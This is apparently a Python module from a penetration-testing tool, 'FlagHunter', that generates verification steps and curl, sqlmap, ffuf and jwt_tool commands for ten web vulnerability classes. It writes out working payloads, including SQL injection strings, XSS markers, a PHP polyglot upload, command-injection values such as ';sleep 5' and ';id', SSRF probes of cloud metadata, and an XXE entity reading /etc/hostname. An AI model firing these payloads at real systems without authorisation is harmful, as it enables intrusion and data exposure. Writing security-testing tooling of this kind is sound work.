"""Manual-verification playbooks for each vulnerability category.

For a given finding (category + URL + entry point + method) this produces:

* ``steps``    - a numbered, do-this-yourself verification plan;
* ``commands`` - copy-paste-ready Linux/Kali commands (curl + the right tool);
* ``expected`` - what a *vulnerable* result looks like versus a safe one.

These are guidance for a human operator on an **authorised** target. FlagHunter
does not run the intrusive ones for you; it hands you the commands so you stay in
control of anything that could change state or read protected data.

Implementation note: command strings are built with plain concatenation (not
f-strings) so that payloads containing ``{`` / ``}`` / ``\\`` stay correct on
every supported Python (3.9+ / Kali's system Python included).
"""

from __future__ import annotations

import shlex
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse


def _q(value: str) -> str:
    return shlex.quote(value)


def _with_param(url: str, param: str, value: str) -> str:
    """Return ``url`` with ``param`` set to ``value`` in the query string."""
    p = urlparse(url)
    pairs = [(k, v) for k, v in parse_qsl(p.query, keep_blank_values=True) if k != param]
    pairs.append((param, value))
    return urlunparse((p.scheme, p.netloc, p.path, "", urlencode(pairs), ""))


def _base(url: str) -> str:
    p = urlparse(url)
    return p.scheme + "://" + p.netloc


def _loc(param: str, method: str) -> str:
    if param:
        kind = "POST field" if method == "POST" else "parameter"
        return "the `" + param + "` " + kind
    return "the request"


def _curl_get(url: str, param: str, value: str, suffix: str = "") -> str:
    target = _with_param(url, param, value) if param else url
    cmd = "curl -sik " + _q(target)
    return cmd + suffix


def _curl_post(url: str, param: str, value: str, urlencode_data: bool = False,
               suffix: str = "") -> str:
    flag = "--data-urlencode " if urlencode_data else "--data "
    cmd = "curl -sik -X POST " + _q(url) + " " + flag + _q(param + "=" + value)
    return cmd + suffix


def build(category: str, url: str, entry_point: str = "", method: str = "GET",
          enctype: str = "") -> dict:
    param = entry_point if entry_point and ":" not in entry_point else ""
    builder = _BUILDERS.get(category, _generic)
    steps, commands, expected = builder(url, param, method, entry_point, enctype)
    baseline = "curl -sik " + _q(url) + "            # baseline: status, headers, body"
    if baseline not in commands:
        commands = [baseline] + commands
    return {"verification": steps, "commands": commands, "expected": expected}


# --- per-category builders ---------------------------------------------------
def _sqli(url, param, method, entry_point, enctype):
    steps = [
        "1. Capture a normal response for " + _loc(param, method) + " as a baseline.",
        "2. Send a single quote (') in " + _loc(param, method) + " and look for a SQL error, "
        "a 500, or a changed response length.",
        "3. Compare a true condition (' OR '1'='1) against a false one (' AND '1'='2): "
        "different results mean the input reaches the query.",
        "4. If error/boolean differences appear, confirm with a time-based check, then hand the "
        "exact request to sqlmap for controlled confirmation.",
    ]
    p = param or ""
    if method == "POST" and p:
        cmds = [
            _curl_post(url, p, "1'"),
            _curl_post(url, p, "1' OR '1'='1"),
            _curl_post(url, p, "1' AND '1'='2"),
            "sqlmap -u " + _q(url) + " --data " + _q(p + "=1") + " -p " + _q(p) + " --batch --level 2 --risk 1",
        ]
    else:
        cmds = [
            _curl_get(url, p, "1'"),
            _curl_get(url, p, "1' OR '1'='1"),
            _curl_get(url, p, "1' AND '1'='2"),
            "sqlmap -u " + _q(_with_param(url, p, "1") if p else url)
            + ((" -p " + _q(p)) if p else "") + " --batch --level 2 --risk 1",
        ]
    expected = (
        "Vulnerable: a DB error (e.g. 'SQL syntax', 'ORA-00933', 'unterminated quoted string') "
        "or the true/false payloads return clearly different pages/lengths. "
        "Safe: identical responses and no error regardless of the quote."
    )
    return steps, cmds, expected


def _xss(url, param, method, entry_point, enctype):
    marker = "fhx<svg/onload=1>"
    p = param or ""
    steps = [
        "1. Inject a unique marker (fhx7391) into " + _loc(param, method)
        + " and find where it lands (HTML body, attribute, or <script>).",
        "2. Pick a context payload: <svg onload=...> in HTML body, \"><script> to break out of an "
        "attribute, or ';alert(1)// inside a script block.",
        "3. Confirm the payload comes back *unencoded* and would execute in a browser.",
        "4. For stored XSS, submit via the form then reload the page that displays the value.",
    ]
    if method == "POST" and p:
        cmds = [
            _curl_post(url, p, "fhx7391", suffix=" | grep -n fhx7391"),
            _curl_post(url, p, marker, urlencode_data=True, suffix=" | grep -n 'svg/onload'"),
        ]
    else:
        cmds = [
            _curl_get(url, p, "fhx7391", suffix=" | grep -n fhx7391"),
            _curl_get(url, p, marker, suffix=" | grep -n 'svg/onload'"),
        ]
    expected = (
        "Vulnerable: the marker/payload is reflected verbatim with angle brackets intact "
        "(you see <svg/onload=1> in the HTML source). Safe: it returns HTML-encoded as "
        "&lt;svg...&gt; or stripped."
    )
    return steps, cmds, expected


def _idor(url, param, method, entry_point, enctype):
    p = param or "id"
    steps = [
        "1. As user A, note an object id you own in " + _loc(param, method) + ".",
        "2. Change that id (±1, or user B's id) while keeping user A's session.",
        "3. Compare responses: receiving another user's data proves IDOR.",
        "4. Automate the id sweep with ffuf/wfuzz and diff response sizes.",
    ]
    cmds = [
        "curl -sik -b 'session=YOUR_COOKIE' " + _q(_with_param(url, p, "1")),
        "curl -sik -b 'session=YOUR_COOKIE' " + _q(_with_param(url, p, "2")),
        "ffuf -w <(seq 1 50) -b 'session=YOUR_COOKIE' -u " + _q(_with_param(url, p, "FUZZ")) + " -mc 200 -fs 0",
    ]
    expected = (
        "Vulnerable: a different id returns another user's/record's data with your own session and "
        "HTTP 200. Safe: 401/403, a redirect to login, or an 'access denied' body."
    )
    return steps, cmds, expected


def _cookie_auth(url, param, method, entry_point, enctype):
    cname = entry_point.split(":", 1)[1] if entry_point.startswith("cookie:") else "session"
    steps = [
        "1. Inspect the `" + cname + "` cookie: flat value (admin=0, role=user) or signed token?",
        "2. Flip the privilege value (admin=0->1, role=user->admin) and resend.",
        "3. If it is a JWT, test alg=none / a weak secret with jwt_tool.",
        "4. Access a privileged page with the modified cookie and see if it is honoured.",
    ]
    cmds = [
        "curl -sik -b " + _q(cname + "=0") + " " + _q(url),
        "curl -sik -b " + _q(cname + "=1") + " " + _q(url) + "            # try privileged value",
        "curl -sik -b " + _q(cname + "=admin") + " " + _q(url),
        "# If JWT:  jwt_tool <token> -X a      # test alg:none",
    ]
    expected = (
        "Vulnerable: changing the cookie value alone grants extra access or an admin view (the "
        "server trusts the client-set value). Safe: the server rejects the tampered cookie or "
        "re-validates server-side."
    )
    return steps, cmds, expected


def _file_upload(url, param, method, entry_point, enctype):
    field = param or "file"
    steps = [
        "1. Upload a known-good image and note the stored URL/path returned.",
        "2. Test type checks: change extension (.php, .phtml, .svg, .html), spoof Content-Type, "
        "try a double extension (shell.php.jpg).",
        "3. Add magic bytes if the check is content-based (GIF89a; then code).",
        "4. If an executable type is stored under the web root and served, request it. "
        "Only on an authorised CTF target.",
    ]
    cmds = [
        "curl -sik -X POST " + _q(url) + " -F " + _q(field + "=@test.txt;type=text/plain"),
        "curl -sik -X POST " + _q(url) + " -F " + _q(field + "=@shell.php;type=image/jpeg"),
        "printf 'GIF89a;<?php echo 1;?>' > poly.php.gif   # content-sniff bypass test file",
        "curl -sik -X POST " + _q(url) + " -F " + _q(field + "=@poly.php.gif"),
    ]
    expected = (
        "Vulnerable: a server-side executable extension is accepted and later served/executed, or "
        "validation relies only on the client. Safe: the upload is rejected, renamed, stored "
        "outside the web root, or served as a non-executable type."
    )
    return steps, cmds, expected


def _ssrf(url, param, method, entry_point, enctype):
    field = param or "url"
    listener = "http://YOUR_LISTENER:8000/ssrf"
    steps = [
        "1. Point " + _loc(param, method) + " at a listener you control and watch for a hit.",
        "2. Try internal targets relevant to the lab (169.254.169.254 metadata, 127.0.0.1, other "
        "VPN hosts) and compare responses.",
        "3. Test scheme/parser tricks (file://, gopher://, redirects, @-tricks) if a filter exists.",
        "4. Use response differences (timing, size, error) to infer what was reached.",
    ]
    cmds = [
        "python3 -m http.server 8000     # run a listener in another terminal",
        "curl -sik " + _q(_with_param(url, field, listener)),
        "curl -sik " + _q(_with_param(url, field, "http://127.0.0.1:80/")),
        "curl -sik " + _q(_with_param(url, field, "http://169.254.169.254/latest/meta-data/")),
    ]
    expected = (
        "Vulnerable: your listener receives a request, or internal-only content/errors come back "
        "through the parameter. Safe: the destination is allow-listed, blocked, or only your own "
        "supplied host is contacted."
    )
    return steps, cmds, expected


def _command_injection(url, param, method, entry_point, enctype):
    p = param or "cmd"
    steps = [
        "1. Append shell metacharacters to " + _loc(param, method) + " (; | & `) with a benign "
        "command like `id` or `sleep 5`.",
        "2. Prefer a time-based probe (;sleep 5) first - a ~5s delay is a strong, low-noise signal.",
        "3. If output is reflected, read a harmless command's result (id, uname -a).",
        "4. Do not run destructive commands; confirm with timing/benign output only.",
    ]
    cmds = [
        "curl -sik -w '\\n%{time_total}s\\n' " + _q(_with_param(url, p, "127.0.0.1;sleep 5")),
        "curl -sik " + _q(_with_param(url, p, "127.0.0.1;id")),
        "curl -sik " + _q(_with_param(url, p, "127.0.0.1`id`")),
    ]
    expected = (
        "Vulnerable: the sleep payload delays the response by ~5s, or id/uname output appears in "
        "the body. Safe: no delay and no command output - input is treated as data."
    )
    return steps, cmds, expected


def _broken_access(url, param, method, entry_point, enctype):
    steps = [
        "1. Request the privileged/admin path with NO authentication and note the status.",
        "2. Request it as a low-privilege user; 200 with admin content is broken access control.",
        "3. Test verb tampering (GET vs POST) and header tricks (X-Original-URL, X-Forwarded-For).",
        "4. Brute common admin paths to find unlinked but reachable functionality.",
    ]
    cmds = [
        "curl -sik " + _q(url) + "                               # unauthenticated",
        "curl -sik -b 'session=LOW_PRIV_COOKIE' " + _q(url) + "  # low-priv user",
        "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u " + _q(_base(url) + "/FUZZ") + " -mc 200,301,302",
    ]
    expected = (
        "Vulnerable: a privileged page returns 200 with real content to an unauthenticated or "
        "low-privilege user. Safe: 401/403 or a redirect to login for everyone without rights."
    )
    return steps, cmds, expected


def _xxe(url, param, method, entry_point, enctype):
    payload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "FHXXE">]><r>&x;</r>'
    heredoc = (
        "cat > xxe.xml <<'XML'\n"
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>\n'
        "<r>&x;</r>\n"
        "XML"
    )
    steps = [
        "1. Find where the app accepts XML (Content-Type: application/xml, SOAP, SVG, DOCX).",
        "2. Submit XML with a harmless internal entity and confirm it is expanded in the response.",
        "3. Escalate to a file entity (file:///etc/hostname) on an authorised target to confirm "
        "external-entity processing.",
        "4. If direct output is blocked, test an out-of-band entity to your own listener (blind XXE).",
    ]
    cmds = [
        heredoc,
        "curl -sik -X POST " + _q(url) + " -H 'Content-Type: application/xml' --data " + _q(payload),
        "curl -sik -X POST " + _q(url) + " -H 'Content-Type: application/xml' --data @xxe.xml",
    ]
    expected = (
        "Vulnerable: the entity is expanded - you see 'FHXXE' (or file contents) in the response. "
        "Safe: the entity is not resolved, or the parser rejects the DOCTYPE/DTD."
    )
    return steps, cmds, expected


def _ssti(url, param, method, entry_point, enctype):
    p = param or "name"
    jinja = "fh{{7*7}}"
    freemarker = "fh${7*7}"
    erb = "fh<%= 7*7 %>"
    steps = [
        "1. Inject a math marker into " + _loc(param, method)
        + ": fh{{7*7}} (Jinja/Twig), fh${7*7} (Freemarker/JSP), fh<%= 7*7 %> (ERB).",
        "2. If the response contains 'fh49', the expression was evaluated server-side (SSTI).",
        "3. Identify the engine from which syntax works, then escalate carefully to read config.",
        "4. Keep payloads to arithmetic/introspection; avoid OS-command gadgets unless the rules of "
        "engagement allow it.",
    ]
    cmds = [
        _curl_get(url, p, jinja, suffix=" | grep -n fh49"),
        _curl_get(url, p, freemarker, suffix=" | grep -n fh49"),
        _curl_get(url, p, erb, suffix=" | grep -n fh49"),
    ]
    if method == "POST":
        cmds = [_curl_post(url, p, jinja, urlencode_data=True, suffix=" | grep -n fh49")] + cmds
    expected = (
        "Vulnerable: the response shows 'fh49' - the engine evaluated 7*7. "
        "Safe: the literal fh{{7*7}} (or an encoded form) is returned unevaluated."
    )
    return steps, cmds, expected


def _generic(url, param, method, entry_point, enctype):
    steps = [
        "1. Reproduce the response for " + _loc(param, method) + " and read it carefully.",
        "2. Vary the input and compare status, length, timing and error messages.",
        "3. Confirm manually before treating this as a real vulnerability.",
    ]
    cmds = ["curl -sik " + _q(url)]
    expected = "Review the differences between normal and modified requests to judge impact."
    return steps, cmds, expected


_BUILDERS = {
    "SQLI": _sqli,
    "XSS": _xss,
    "IDOR": _idor,
    "COOKIE_AUTH": _cookie_auth,
    "FILE_UPLOAD": _file_upload,
    "SSRF": _ssrf,
    "COMMAND_INJECTION": _command_injection,
    "BROKEN_ACCESS_CONTROL": _broken_access,
    "XXE": _xxe,
    "SSTI": _ssti,
}
